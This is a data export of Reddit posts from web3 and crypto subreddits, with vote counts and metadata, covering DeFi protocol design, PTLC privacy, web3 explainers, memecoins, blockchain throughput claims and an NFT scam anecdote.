L1 DeFi protocol. Let's discuss the concept,"i am a backend dev working on defi projects. since i started to dive into defi deeper, i got an obsessive idea i just have to get out of my system. i’d love to if someone criticises it constructively. why not shape specific decentralised protocol around defi? here some basic thoughts. defi is all about the rules how value should be distributed. there are finite number of tools types serving this purpose. thus there is no need in classic smart contracts agility. the protocol could have limited but sufficient number of possibilities to launch your own defi tool. users can operate just with high level abstractions, while all essential algorithms are predetermined by node software. it makes the system load predictable. this is the place where things become interesting. since protocol algorithms are predetermined, transactions types should be structurally predetermined as well. however it doesn’t limit us in the number of transactions types. each type should represent system activity component. for example there should be «place order» txn, «cancel order» txn, «trade» txn, etc. this approach allows to build order book spot markets, derivatives and lending markets right in layer 1 chain. which means (1) less intermediaries, (2) less fees, (3) more safety, (4) more usability. sticking to this idea, we can spread to protocol economic base rethinking. since we have no need in classic smart contracts system, we have no need in gas concept. so why shouldn’t we squeeze max out of the idea and make «supportive» transactions, such as «place» and «cancel» orders ones, free. in the end one should pay just for beneficial actions, so transactions types like «trade», «open leverage position», «open derivative position» should should incur charges. to prevent pay-2-win behaviour let’s make fees flat, so no one could pay a little bit more to execute one’s order first. last, to make the system reliable and fast, let’s guarantee valid transaction to be included into upcoming block algorithmically. alright, what do we have so far. decentralised l1 protocol with flexible, flat fees table across defi segments, which prevents orders front running, excludes additional intermediaries and allows you to build customised defi tools: from l1 order book spot markets to sophisticated derivatives. but wait. if there is flat fees table and guarantees that each valid transaction has to be included into new upcoming block, why anyone should care about network maintenance? what’s the motivation to hold full node? how will protocol become truly decentralised? well, let’s spread transactions fees among node holders evenly. and to make an economic sense out of it, let’s limit the number of node holders participating in fees distribution at a given moment of time. the limit should depend on protocol trade activity: higher activity — higher the number of participants. alright, what about speed in terms of consensus? how do we decide who’s block will be included into the chain fast? let’s make roles system. we could grant the leader role to one of the node holders and transition it randomly among participating nodes over time. the other nodes become auditors. to motivate auditors lets make each node holder provide security deposit. if any leader’s misbehaviour occurs, the first auditor reports it earns the leader’s security deposit and the network accepts auditor block. so, this is the big picture. what do you think? i am eager to constructive feedback",10,8,1.0,2024-10-18 06:45:57,web3,CryptoTechnology,AnkyDu77,False,19.2

PTLCs: The Standard(?),"one major advantage of ptlcs over htlcs for atomic swaps is that there is no direct on-chain linkage of paired ptlcs. however, as with anything related to privacy, heuristics and correlation of metadata such as timing can link txs with high degree of confidence. the privacy of a single ptlc thus depends on the existence of other ptlcs; the greater the anonymity set the better. here are some ideas, used together, to get full advantage of ptlcs. (for the sake of this discussion, we will assume that the increased plasma requirements are not a problem.) 1. externally, only use standard sends when the desired outcome is a public payment between two known addresses. internally, only use standard sends for organizing funds between accounts that are already correlated. 2. if seeking to create a new on-chain identity, when sending funds to a new address, always use a ptlc. this is only effective when other metadata is not correlated. need to have wallet features to disable auto-receiving, and to help the user collect rewards at different times. random pillar delegation selection. with a big enough anonymity set, this is much better than say sending to a cex and withdrawing. 3. when sending funds to other users, send ptlcs to each other. this is similar to bitcoin’s concept of coinjoins. if you want to send a user 5 znn, instead create a ptlc sending them 10 znn, and they will create a ptlc sending you 5. these are actually more private than coinjoins because all ptlcs contribute to the anon set of all other ptlcs within a certain timespan. 4. add randomness by default to timing parameters to prevent correlation. 5. prefer disposable bip340 point types even for zts-zts swaps, to increase the anonyminity set of cross chain swaps with btc. 6. i might refactor the ptlc embedded to have an account model where ptlcs can be created and unlocked within the embedded contract without needing to withdraw to a zenon address. this can enable high plasma accounts to better take advantage of the proxy unlock feature and greatly increase the number of ptlcs for greater anonymity set.

Importance of blockchain in today’s World..,"blockchains capacity to offer decentralisation, security and transparency across a range of businesses has made it a game-changer in today’s technological landscape. here is why it’s so important: 1. decentralisation:the main reason blockchains are decentralised is to avoid putting control in the hands of a few. decentralised blockchains are designed to be unalterable and once the data is entered it is irreversible. since blockchain functions decentralised, there is less chance of fraud or manipulation. 2. ⁠transparency: everybody connected to the network may see every transaction on a blockchain. so that all the transactions and data on the network are available to everyone with access to the system. 3. ⁠financial inclusion: without requiring traditional banking infrastructure, blockchain gives people in under banked or unbanked areas access to financial services. built on blockchain technology, cryptocurrencies enable cheap, quick and worldwide payments. 4. ⁠smart contracts: smart contracts are particularly useful in industries like real estate, legal services, and insurance. these are automatically executing agreements with stipulations encoded straight into the code. they cut transaction costs, and automate procedures. these are self executing contracts with the terms directly written into code. 5. ⁠supply chain management: by documenting each stage of the procedure, blockchain enhances supply chains, transparency. businesses are able to track the movement and origin of items, minimising fraud and guaranteeing authenticity. 6. ⁠digital identity and privacy: blockchain offers a decentralised, safe method of handling personal information. people now possess greater authority over their digital identities and lower the likelihood of data breaches. 7. ⁠innovation in art and intellectual property: blockchain is being used in the art sector to sell digital art using nfts (non-fungible tokens) and to verify provenance and ownership. this guarantees that producers and artists may monitor and profit from their work. 8. ⁠security: cryptography is used to secure blockchain transactions. data that has been recorded is almost impossible to change without the networks approval, making it extremely safe for private information like financial transactions and personal information. all things considered, blockchain is essential for the future of a variety of industries, including finance, healthcare, governance and more, because it promotes trust, security and decentralisation. more applications that are investigated, the more it has the potential to upend established system.",11,6,1.0,2024-09-21 13:57:37,web3,BlockchainStartups,SabilAhmad77,False,19.0

How to sell out your NFT collections in 2 mins!,"i recently delved into the success story behind **poglin's nft** collection, which sold out over 5,000 pieces in under two minutes, and i thought i'd share some key takeaways that could benefit anyone in the digital community space, especially in the realm of nfts. **1. the importance of building a community before launch: poglin's** strategy wasn't just about selling nfts; it was about creating a community. they focused on growing their discord channel to 10,000 members before launching their nfts. this base of engaged members was crucial to their rapid sell-out. **2. using twitter spaces effectively:** regular, authentic engagement in twitter spaces helped poglin to not just grow their community but also to strengthen it. the key? make friends, share your journey, but never pressure your audience. it’s about connection, not just promotion. **3. building resilience in tough times:** interestingly, **poglin's** growth occurred during a bear market, a period typically challenging for new ventures. their approach? be honest, be compassionate, and focus on building a community of true believers and supporters. **4. hosting your own space:** **poglin's** success with twitter spaces started with a small group and grew organically. they emphasized making these spaces safe and open for genuine discussions, which in turn, encouraged more participation and engagement.",11,8,0.87,2024-01-06 13:12:16,web3,NFT,EntryElectronic,False,18.5

Why Is Web 3.0 Important?,"# general conclusion in early 2021, we had discussions on the idea of building a decentralised internet, commonly referred to as web 3.0. * in the united states president trump has been banned from using twitter, and parler, which uses aws services, has been removed from playstore and appstore. * whatsapp has announced that they will share information with their parent company facebook * uganda has ordered internet service providers to block all social networking platforms these are important and understandable issues and need to be actively discussed.small businesses and startups rely on facebook advertising services, google search suggestions, and amazon's aws service to survive. artists and creators face the risk of having their information deleted from sites like spotify, instagram and tiktok. although these are not new problems, it is becoming more and more serious. the development of technology monopolies and their scalability to information privacy rights and personal freedoms has spurred the internet transition from web 2.0 to web 3.0. # what is web 3.0? >in short: web 3.0 is the next era of internet. web 3.0 (commonly called web3) is a reform model aimed at democratising the internet. web 3.0 is present in the crypto space and other digital fields such as ai, virtual and augmented reality, and more. by applying new technologies, web 3.0 is changing how we, as a collective, view and value the internet. web 3.0 is about creating an internet that works for everyone, owned by everyone. # where web 3.0 comes from the term was originally coined in 2014 and popularised in 2018 by ethereum co-founder and polkadot founder gavin wood. the spirit of this term goes back to when satoshi developed bitcoin and advocated decentralised dns called bitdns. >“i think it would be possible for bitdns to be a completely separate network and separate blockchain, yet share cpu power with bitcoin.” - satoshi (2010) dns has long been controlled by organisations such as verisign and the internet corporation for assigned names and numbers (icann) overseen by the us department of commerce. this centralised control of dns has been used to enforce ip rights, prohibit websites from selling copyrighted material, censor free-of-speech sites like wikileaks and seize domain names (ip addresses) without proper procedures, etc. censorship decisions are usually influenced by the top levels of government and the lobbyists of the largest multinational organisations, who may not always be acting in the best interests of the general public.satoshi and other bitcoin enthusiasts recognised this. in 2011, a fork of bitcoin called namecoin was born to allow censorship-proof domains at *.bit* domain addresses.namecoin was ahead of its time. a proxy service or extension (such as metamask today) was required to log in at the *.bit* domain, making it very difficult to use. plus, most people did not want their own website or personal domain at that time. all of this caused namecoin to fail because of low demand from its users.ten years later and now new blockchains and decentralised services may be ready for success. these applications are making the internet more decentralised with web 3.0. another example of such infrastructure is the handshake network. # conclude the early internet needed avant-garde programmers and businesses to develop new products to make the internet useful and to be rewarded for the value they created. no one knows in advance what the consequences of their construction will be.cryptonetworks, with their open-source protocols and everyone-owned networks, offers the opportunity to restructure the internet into a system that benefits more people around the world. this is a vision worth striving for.the world evolving today is increasingly controlled by technology, so we must design systems that benefit the collective. the transformation of the internet, from web 2.0 to web 3.0, is diverse and will change the way we interact with the internet.",15,2,0.86,2021-09-19 21:58:57,web3,web3,economicsdesign,False,18.4

Blockchain as a Datastructure,"blockchain is a good way to order block of sequential data that can be validated by others. countless real-world examples show that it scales pretty well. in my app, i am testing the use of a blockchain for storing ""chat app data"" selfhosted-only. the app is a work-in-progress proof-of-concept and experimental. it is an investigation into creating a distributed and decentralized app. unlike traditional blockchains, the sole purpose of this blockchain is to keep messages between peers in sync. the implementation is have is far from finished, but i have a testable proof-of-concept. the blockchain is entirely in javascript running in a browser. i have a few observations i would like to make: * without the need for mining, it is basically a large array of data. when evaluating the data to be displayed on the ui, it is a ""relatively"" heavy calculation, but i find that it is more than performant enough to be used in a chat app. i find that the messages and data can scale and the app remains quite performant (i haven't really done much to optimise caching). * in cases like a group chat, the data can be validated and synced between multiple peers (which may not all be online). (its worth noting: peers may be able to manipulate the database, but it is not a concern for the app where the purpose is only for blockchain as a datastructure) * why is this kind of datastructure not used more often? there are other blockchain chat apps, but by putting a system like chat on something like ethereum, would typically be expensive to users. but in this case, the blockchain is only used for local data storage and validation. i think this is a good use case for blockchain. when working on your device, you don't need to be conservative about things like message size and so we can store files and images in the blockchain. * with no cryptocurrency, there is no incentive to keep the blockchain alive. the data is easily disposable or persisted as the user prefers. there is no need for a setup process and things like id's and passphrases can be auto-generated behind the scenes away from the user. (the app is currently very experimental, if your data goes, it goes... but it shouldnt matter because there is no financial value to the blockchain) i am very interested in the idea of blockchain as a datastructure and i would like to see it used more often. i think this datastructure will play an important role in my app as it will enable the app to move to a single-user-multi-platform architecture. i would like to hear your thoughts on blockchain as a datastructure. initially i did it investigating if it work on a basic level to help keep messages in sync, but i find that it is quite performant; especially considering it is only running in a browser. (i expect i can easily improve the performance) the demo can be seen here: [https://chat.positive-intentions.com/](https://chat.positive-intentions.com/)",6,17,0.8,2023-11-08 14:00:31,web3,CryptoTechnology,Accurate-Screen8774,False,18.4

Are Memecoins The Only Way To Drive Volume?,"i have been here since the doge coin hype and start of the meme coin season. i remember how doge was the only hyped coin just because elon decided to play god and shilled it on twitter marking the start of a trend which would draw millions of dollars. sometimes i feel elon is the first meme crypto influencer on twitter. bsc marked the go to platform for launching memecoins and the slow launching turned into a fest of pump, dumps and rugs. many made money , many lost money expecting the trend to die but it kept continuing overshadowing utility projects and even big exchanges took to listing memecoins for just volume and not supporting utility based projects. i believe every solana meme trader was once a bsc meme trader and looking how memecoins are pumping left and right , people making mad money despite people calling the meme trend is dead , you got to agree that solana atm turned to a gamble place , you make it or go bust. each day more than 1k+ coins are launching on solana and some say the recent congestion was caused because of that. solana has low transaction fee and is fast but being utilised for purchasing memecoins rather than utility projects feels like a crime. i feel till btc top reaches , this will continue and then die out before people find the next smart chain to trade one. base already is popping up with meme coins. it’s like every smart chain needs meme coins then only they get the volume and recognition. the trend getting so mad that people making coins on events , celebrities , cars , animals, crypto influencers and what not. there’s a coin called powsche based of porsche and i am surprised how porsche hasn’t sued them for copyright infringement, 420, mcweed , ansem cat and the list goes on. utility driven projects need to be launched more and the trend has to shift.",8,14,0.79,2024-04-28 04:54:17,web3,defi,MadShad69,False,18.3

"We are poised for a mindset shift in blockchain gaming. The fundamental question is this: how can we make the hyper-capitalized, hyper-promoted Web3 metaverse project work for gamers, for founders and for investors?","fortunately, technology is growing by leaps and bounds, and web3 is no exception. thanks to its development, there are already several protocols such as oceanprotocol, tea and others, dedicated to web3 developments. links to cinematic trailers, unreal engine mockups and convoluted ""token economic diagrams"" abound, parroting their claims of raising millions in simple deals for future tokens to properly prepare their token launch(s) and their initial offering of decentralized exchanges. the launch date for the game, you ask? perhaps it will be a ""mini-game"" planned for q3, or a massive triple-a launch in mid-2023. and the kind of utilities the token will have on day one? well, you can staking to get more tokens, and they might even give you access to the game's first nft sale. sometimes they even advertise a non-utility utility token and a non-governance governance token, justifying their existence because the big exchanges agreed to list them within a few months. the gamefi token landscape is incredibly fragmented. while early liquidity is enticing, a premature token launch has serious risks. the balancing act between creating sticky tokenomics and designing successful games actually offers a narrower focus for project tokens: user engagement and retention, not pure monetization. the unique value of game apps and metaverses is not the token they put into circulation. the value of the project is created by the revenues that, over the long term, arise from the unique digital assets of the game. when these nft-based assets are owned, experienced and understood by a community, the value builds and increases - otherwise, the community's unwillingness to sell increases. the ultimate optimization problem? maximize retention and engagement of additional users per project token issued, subject to some level of existing web3 revenue and user community.",14,3,0.86,2022-05-22 07:01:52,web3,web3,Gwen765,False,18.200000000000003
The Blockchain Trilemma: Are We Any Closer to Solving It?,"as blockchain technology continues to evolve, the so-called ""blockchain trilemma""—balancing decentralization, scalability, and security—remains one of the most challenging aspects of the field. while many projects claim to have solutions, the reality is far more nuanced. # 1. decentralization vs. scalability: * **layer 1 vs. layer 2:** while layer 1 solutions like ethereum 2.0 are making strides with proof of stake and sharding, they still face limitations in scaling without compromising decentralization. on the other hand, layer 2 solutions like rollups offer scalability, but at the cost of added complexity and potential centralization risks. * **sharding:** sharding promises to improve transaction throughput by dividing the network into smaller, more manageable pieces. however, the challenge remains in ensuring cross-shard communication is efficient and secure, without compromising the network’s overall integrity. # 2. security vs. scalability: * **consensus mechanisms:** the shift from proof of work (pow) to proof of stake (pos) has introduced new security considerations, particularly around the long-term sustainability of validator incentives. while pos is more energy-efficient, it’s still unclear if it can provide the same level of security as pow in the long run. * **zk-snarks and zk-starks:** zero-knowledge proofs have been touted as the future of privacy and scalability in blockchain. however, their computational complexity and the trade-offs between security and efficiency remain topics of intense research and debate. # 3. interoperability: * **cross-chain solutions:** as we move towards a multi-chain ecosystem, the need for seamless interoperability becomes paramount. protocols like cosmos’ ibc and polkadot’s relay chain are leading the way, but they also introduce potential vulnerabilities and centralization risks. * **atomic swaps and bridges:** while atomic swaps and blockchain bridges offer a way to transfer assets between different chains, they also come with their own set of security challenges, particularly around the potential for smart contract exploits. # 4. the road ahead: * **tokenomics and governance:** the design of robust, sustainable tokenomics is another area where many projects falter. balancing incentives between developers, users, and validators is crucial for long-term success. additionally, decentralized governance models, such as daos, are still in their infancy and face challenges like voter apathy and governance attacks. blockchain technology is at a critical juncture. the solutions we develop now will shape the future of decentralized systems. what are your thoughts on the current approaches to the trilemma? are we truly making progress, or are we just trading one set of problems for another? let’s dive into a deep discussion about where we are and where we’re headed.",5,13,1.0,2024-09-17 02:34:24,web3,BlockchainStartups,withmrshashank,False,18.2

Litheum: A New Era in Blockchain Technology,"litheum is poised to revolutionize the blockchain landscape with its novel consensus mechanism, proof of performance (pop), and a groundbreaking design paradigm called true decentralization. by tackling the scaling challenge from the ground up, litheum aims to unify scalability and decentralization in a way that has never been achieved before. network participants are incentivized to deploy useful hardware—cpus, bandwidth, memory, and more—to handle trillions of transactions daily, ensuring the network's robustness and efficiency. founded by clayton, who first encountered bitcoin in 2011, litheum is the culmination of over a decade of experience and innovation in the blockchain space. clayton's journey began with a deep fascination for bitcoin's whitepaper, which led him to spend countless hours researching and sharing his newfound knowledge. his professional career took him to google, where he worked on the ad traffic quality team, learning the intricacies of building internet-scale applications. despite google's massive investment in ai, clayton was struck by the company's lack of interest in blockchain technology. this realization drove him to leave google and immerse himself in the blockchain industry, developing blockchain bridge, a solution for enterprise integration with ethereum. however, he soon grew frustrated with the limitations of current blockchain infrastructure, particularly the gas problem. in 2017, clayton became disillusioned with bitcoin's pivot from a global cash-like payment system to ""digital gold"" and predicted the shortcomings of the lightning network. his skepticism extended to bitcoin cash and its inability to address fundamental scalability issues. after a stint with saito, clayton developed proof of performance and decided to focus entirely on litheum in 2021. today, the litheum team comprises top-tier engineers and a marketing team uniquely attuned to decentralized technology. with its commitment to true decentralization and first principles design, litheum is set to deliver impactful decentralized applications, reshaping the blockchain space and fulfilling the original vision of a truly decentralized, accessible, and user-friendly technology. welcome to the bigchain—welcome to litheum. visit now: [https://www.litheum.com/welcome-to-litheum](https://www.litheum.com/welcome-to-litheum)",8,8,1.0,2024-07-25 20:48:25,web3,BlockchainStartups,No_Ingenuity_4990,False,18.0

"What’s the Difference Between Web3, Blockchain, and Decentralization?","when it comes to web3, along with its major components—blockchain and decentralization—one should understand that all of them are related but imply different things. **web3**, for its part, means the next version of the internet—open, decentralized by design, and built for users. it’s about decentralizing by empowering users to own their data and identities and regain control of them. **blockchain** is a term that has applications in web3. it is a public database that stores transactions in a decentralized network of computers where, once a transaction is made, it cannot be changed. thanks to decentralization, blockchain is transparent and secure, serving as the basis of web3 technologies such as cryptocurrencies and defi. one of web3’s and blockchain’s goals is **decentralization**. this involves decentralizing control and decision-making from a central entity (such as conglomerates, big tech companies, or governments). compared to centralized systems, decentralized systems have no specific authority, leading to improved security, privacy, and users’ self-governance. these concepts are interrelated; blockchain is the underlying technology of decentralization, which supports the vision of web3. it’s important to understand these differences as the world becomes increasingly decentralized in the digital realm. to dive deeper into how these technologies are shaping the future, you can explore more resources and insights [here](https://web3career.in).",9,6,1.0,2024-08-29 08:18:16,web3,BlockchainStartups,Budget-Bet3413,False,17.8
Web2 vs Web3,"web2 refers to the current version of the internet that most of us are familiar with. a web dominated by businesses that offer services in exchange for your personal information. decentralized apps that operate on the blockchain are referred to as web3 in the context of ethereum. these are apps that allow anyone to join without their personal information being sold. many web3 developers have chosen to build dapps because of ethereum's inherent decentralization: anyone who is on the network has permission to use the service – or in other words, permission isn't required. no one can block you or deny you access to the service. payments are built in via the native token, ether (eth). ethereum is turing-complete, meaning you can pretty much program anything. just for comparison: on web2 twitter can censor any account or tweet, while web3 tweets would be uncensorable because control is decentralized; payment service may decide to not allow payments for certain types of work, web3 payment apps require no personal data and can't prevent payments. these are just some of the pros that web3 is going to bring. communication on web3 is going to be much safer also. some decentralized mails like ledger mail or crypter mail are already developed and can be used on web2, so you can try it. don't hesitate to leave your opinion on this.",13,4,0.84,2021-12-20 18:16:01,web3,web3,kajle187,False,17.8

Ceramic Network: Clay Testnet is officially live!,"&#x200b; https://i.redd.it/oyjj4h073xd61.gif **after more than a year of hard work, the ceramic team is excited to officially unveil the ceramic clay testnet.** starting today you can experiment, prototype, and develop applications on top of the [**ceramic protocol**](https://github.com/ceramicnetwork/ceramic). keep in mind, the clay network is *experimental* and should only be used for prototyping, development, and testing purposes. it's great for getting your application ready for mainnet (scheduled for late q1 or early q2 2021). for those new to the technology, ceramic is a public, permissionless, censorship-resistant network for managing mutable information on the open internet. by combining a stack of cutting-edge web3 technologies including ipfs, libp2p, blockchain, dids, and authenticated (signed/encrypted) data standards, ceramic gives developers the ability to build completely serverless applications using dynamic, verifiable, decentralized data. ceramic can be used with any blockchain and currently supports ethereum, filecoin, cosmos, eos, with polkadot and others coming soon. along with this announcement, [**idx**](https://idx.xyz/), a protocol for cross-platform decentralized identity and interoperable user data built on top of ceramic has entered beta. the idx sdk is a useful tool for adding decentralized identity functionality to your already existing application, and is an easy entry point to get started with ceramic. idx currently runs on the clay testnet, so it has the same guarantees as ceramic and will move to production when mainnet launches. \-- to learn more about the clay testnet, read the [**official announcement**](https://blog.ceramic.network/ceramic-network-clay-testnet/) or our [**twitter thread**](https://twitter.com/ceramicnetwork/status/1354448316512284675?s=20). to get started, try the [**demo app**](https://playground.ceramic.dev/) and jump into the [**docs**](https://developers.ceramic.network/build/quick-start/).",12,3,0.94,2021-01-27 13:24:45,web3,web3,oed_,False,17.799999999999997
Are web3 development platforms the future of the internet?,"moralis, a web3 development platform, announced a $40 million series a fundraising round on wednesday. eqt ventures, fabric ventures, coinbase ventures, and dispersion capital are among the angel investors in the platform, which debuted last june. the stockholm-based company, which offers a cross-chain infrastructure for developers to create and deploy applications, games, and nfts, said that the funds would be used for product development, boosting user experience, and expanding to accommodate more significant customers. moralis refused to share its valuation. its software addresses issues that developers have while transitioning from web2 systems to decentralized blockchain apps. like orbs, a public blockchain infrastructure designed as a separate execution layer that operates in conjunction with evm-based l1s and l2s and zetrix, a next-generation layer-1 public blockchain infrastructure that will help establish a future ecosystem of ubiquitous trust networks by enabling multi-chain sharding. ""we are sure that web3 is the next generation of the internet. we view ourselves as the ideal partner for developers looking to transition from web2 to web3,"" said ivan liljeqvist, co-founder and ceo. according to the firm, customer feedback shows that its platform has saved developers more than $86 million in engineering expenditures. this is the latest indication that investors are rushing to web3 adoption efforts. fabric ventures announced two web3-focused funds totaling $245 million in april. what do you think? are you seeing web 3 development platforms taking over the internet? source of new: www.theblockcrypto.com",12,8,0.74,2022-05-15 13:57:18,web3,web3,Royal76543,False,17.799999999999997

"can someone explain to me the ""decentralization"" issue of solana?","solana seems to be doing just fine in this aspect. it has 4700 nodes all throughout the world: https://solanacompass.com/statistics/decentralization. how is it less centralized than eth that is causing concerns for people? if someone were to attack solana, do they need to have like 50% or more control over those nodes? that seems very unlikely doesn't it? even if a government can censor some of these nodes, they seem spreadout throughout the world so it would require multiple governments to work together. i think the cost running a validator on solana is higher than eth so there's less validators but even then, we have 4700 atm and it's only going to increase from here on. taking over 51% of sol tokens is also just seems highly unlikely as that would require 57.5 billion dollars and if they do attack the chain with it, they would just be losing 57.5b so its very unlikely. is ethereum focusing on decentralization too much even though solana is doing just fine with a ""lesser"" amount of decentralization? how could this ever be an issue in its current form?",6,15,0.81,2024-11-18 00:39:09,web3,solana,jadequarter,False,17.700000000000003
Question: How can we preserve the freedom of our virtual future?,"# virtual civilization it's my distinct belief that when a virtual world arises in which we can have a sense of presence equivalent to that which we have in physical life, virtual worlds will revolutionize our world. # augmented reality as the basis i believe that augmented reality will pave the way over the next 5-7 years for people to enjoy the convenience of a computer you don't have to hold in your hand and that can understand your hand movements as physical gestures interpretable by the machine. there are a lot of people who really struggle to understand computers and i believe augmented reality will make it much easier for them to interact with computers as a whole through spatial computing. this underlying utility may pave the way for a virtual world ecosystem in which people may be able to get the same level of the sense of presence that they get in physical life in a digital space. # the transition to digital civilization it's my belief that when we are able to get the same sense of presence in a virtual space as in a physical space, we will stop building physical spaces. # the potential for crisis every virtual world creator has the right to manage their own virtual world as they wish. however, if a virtual world becomes essential for human life, that creator may create large-scale censorship for a large part of the human population. social media giants already ban their members on a regular basis without even stating the reason. for most, these platforms are not essential for life or income but one day virtual worlds may become the reality most call home. * what if one day what we say could get us banned from what most people consider reality? # the context for my question i'd like to come up with a charter of rights and freedoms for the metaverse and i would love your input. the key problem at hand is how we balance the rights of a virtual world creator to the rights of those who inhabit virtual worlds. there's an inherent tension between protecting the rights that a creator has over the world that they create versus the rights of individual users. ## progress so far **right to obscurity** * the right not to be individually penalized for non-criminal acts done outside of a particular virtual world. **right to migration** * the right to switch from virtual world to virtual world without contractual hindrance. **right of privacy** 1. the right not to be tracked in a persistent, identifiable fashion, without expressed, written, and updated consent. 2. the right to separately agree to the tracking of political or religious beliefs. 3. the right to take down, or disassociate from, content published by oneself. ## breaking down the progress **right to obscurity** obscurity is all about making sure a global reputation system for the metaverse is never created. i believe a global reputation system that's interoperable between worlds has the ability to create global censorship and therefore each virtual world should judge its members by their behavior within that world. if not, a single mistake, in the limited interpretation of what a mistake could be by one world, may cause us problems for the rest of our life. **right to migration** as long as we can use viable alternatives to a virtual world, we are never locked out of the metaverse as a whole. the big problem here is that the network effect may make those alternatives unviable just as competing with youtube is almost totally unviable because of youtube’s massive viewer base. **right of privacy** this is all about that extra layer of protection so that you can't be identified as belonging to a particular community as that identification process is the first step to maltreatment. # ok, my question for real this time **how do we ensure that individual rights are fully protected even as we transition from the physical to the digital?** how do we avoid the network effect, (people wanting to be where the other people are) along with the enormous complexity of virtual worlds laying the foundation for a new reality that resembles the lack of rights and freedoms we see from today’s social media giants? let's say that we create a right to interoperability, such a right creates a financial obligation on the creator of a virtual world, something which will stifle innovation potentially. moreover, interoperability isn't practical on so many levels when it comes to complex technology. migration, sure but if one virtual world has the people it's not like those people can just walk into another virtual world -- keep in mind that virtual world creators size all of their doors to all of the items that you could wear in a potential virtual world. a virtual world is a bespoke experience and it's not like you can just mix and match without a jarring and problematic mishmash that leads to less of a sense of immersion.",12,3,0.93,2023-03-23 17:32:16,web3,web3,RedEagle_MGN,False,17.7

Understanding real TPS of popular blockchains,"in the rapidly changing world of blockchain technology, there's a lot of talk about transaction per second (tps) and who's leading the pack. but when we dig deeper into those tps numbers, we find some interesting differences between what's claimed and what's real. blockchain projects like to show off their ""max tps"" numbers, but it's important to take a closer look to see what's really going on. we're going to break down the difference between tps numbers that sound impressive and what they actually mean. to do this, we've used a straightforward approach. we connected to different blockchains, watched transactions closely, and then did some math based on the last 100 blocks. while blockchains have different speeds, we've kept things simple to focus on understanding tps. let's check out the tps claims of solana, arbitrum, avalanche, ethereum, and bitcoin: solana claims ""65,000 transactions per second,"" but the real tps is 299.91. that's a huge 217 times difference. arbitrum talks about ""40,000 transactions per second,"" but the actual tps is only 8.07. that's a whopping 4956 times difference. avalanche says ""4,500 transactions per second,"" but the real tps is just 2.01. that's a significant 2500 times difference. ethereum's max tps is 56, but the current tps is 11.14. it's only 5 times different. bitcoin's theoretical tps is 7, but in reality, it's around 4.18. that's just 1.67 times different. to sum up, there's a big gap between what's claimed and what's actually happening with tps numbers. while big numbers might sound good, the real measure of success for blockchain is how much it's actually being used. source of data is chainspect.app",0,33,0.44,2023-08-28 01:58:27,web3,CryptoTechnology,Rich_Midnight8200,True,17.6

Someone offered me 8 ETH to buy my NFT Paintings..then ghosted me.,"hi everyone, i was recently offered 8 eth (\~20,000 usd) for some abstract expressionism physical paintings that i had listed on facebok marketplace. a few days ago i received an offer on fb marketplace but the buyer wasn't interested in the physical paintings and asked instead if i had them available as nfts since, in their own words, they were an ""nft collector"". initially, i was hesitant and expressed my reluctance to mint and list the nfts. i said only if the offer was good enough. they followed up and said they'd be willing to pay 8 eth (\~20,000 usd) for all 5 paintings! i still realized this could be a scam but nonetheless the prospect of coming across a life changing sum of money was enough of a drive for me. i responded enthusiastically and said i would mint the nfts and get back to them shortly. i finished listing the first painting on opensea after a lot of technical issues (my bank wasn't being helpful) and the whole operation costed me a little under 14 usd - a tiny investment relative to what i was potentially about to make. i go back to contact the buyer and i see that they were still interested in all the nfts. they also embedded a link to a ""secondary nft platform"" i had never heard of called ""collection-sea.com"". not being an idiot, i didn't click on any links and just told them that the first nft is under a collection titled ""echos of expressionism"". once they purchase the first nft (1.6 eth) that will give me enough funds to mint the other 4 paintings. then we'd go our separate ways. but yesterday, i was still growing suspicious and so i booted up my virtual machine and opened the link they sent me for that ""secondary nft platform. yeah it was suspicious 😂. a php website and some bad web design. but the upside is they had a live chat feature, so i messaged then and called out their scam. a few hours ago i went back to fb marketplace and the account is no more. yeah i guess this just sucks overall because i got super excited about the prospect of a life changing sum of money. thanks for listening folks.",7,17,0.65,2024-10-30 08:15:22,web3,NFT,gxd-s,False,17.5

Password manager dapp: is Ethereum L1 worth it?,"i'm bringing neulock password manager to the web3. thanks to its zero-knowledge nature, this password manager can store data onchain without compromising security. our team has finalized the security architecture. roughly speaking, the user will sign in with walletconnect by performing an ethereum personal\_sign on a constant string. two keys will be derived from the resulting hash: a neulock master key, and an aes encryption key. this way, the user can access their passwords on any device simply by connecting to their wallet. the encrypted blob of user data will be uploaded to ipfs/filecoin. as usual with neulock, this data includes no secrets, even after decryption. an updated reference to the current cid of this user data will be kept in an evm smart contract. password creation and updates can be batched, so users can make/change many passwords and commit only one transaction, reducing gas fees. we're now having heated discussions about what chain will host the smart contract. as team leader, i favor hosting it on ethereum l1 for the following reasons: * ethereum l1 has the strongest consensus incentives. * users are more likely to already hold eth than, say, matic or op. * transactions are immediately reflected on l1, increasing security, or at least its perception. l2 advocates have good points as well, of course: * much lower transaction cost: currently, it costs about us$ 5 to commit a batch of password updates to ethereum l1. costs are below $0.50 on l2 and, in many cases, below $0.05. * depending on the l2 chain, transactions can get committed much faster, resulting in better user experience. if we go the l2 way, we still need to decide which l2 to choose. what's your take: does it still make sense to host dapps on ethereum l1 in 2024, given the maturity, greater speed and reduced costs of existing l2? would you prefer to use a password manager on l1 or on any particular l2? thanks!",4,12,1.0,2024-05-02 05:59:22,web3,web3,DevelNeves,False,17.200000000000003

The Future of Web3: A Symphony of Blockchain Collaboration,"navigating the dynamic web3 landscape, it's evident that its future hinges not solely on individual innovations but significantly on the power of collaboration. this concept transcends being a mere buzzword to become the foundation of breakthroughs in the decentralized realm. consider [the collaboration between oasis protocol and ocean protocol](https://oasisprotocol.org/blog/ocean-oasis-strengthened-partnership-announcement) as a prime example. this partnership is far from ordinary. when these two crypto powerhouses came together, they launched the ocean predictoor dapp six months ago, utilizing the sapphire protocol from oasis network. this initiative was not just about leveraging oasis's privacy-centric infrastructure; it represented the immense potential strategic partnerships hold in expanding web3's horizons. the journey towards web3's future is marked by collective endeavors, where varied entities merge their unique capabilities to address intricate challenges. the oasis and ocean protocol collaboration exemplifies more than a singular project achievement. it sets a new standard within the web3 ecosystem, showing the monumental impact that arises when organizations with aligned goals unite. this serves as a crucial reminder for everyone in the crypto sphere: genuine innovation and the broader acceptance of web3 technologies are rooted in collaborative efforts. *what's your take on this? how pivotal do you find collaborations in the web3 arena? have any other partnerships caught your eye recently?*",5,10,1.0,2024-03-09 15:05:54,web3,BlockchainStartups,Milana_Noir,False,17.0

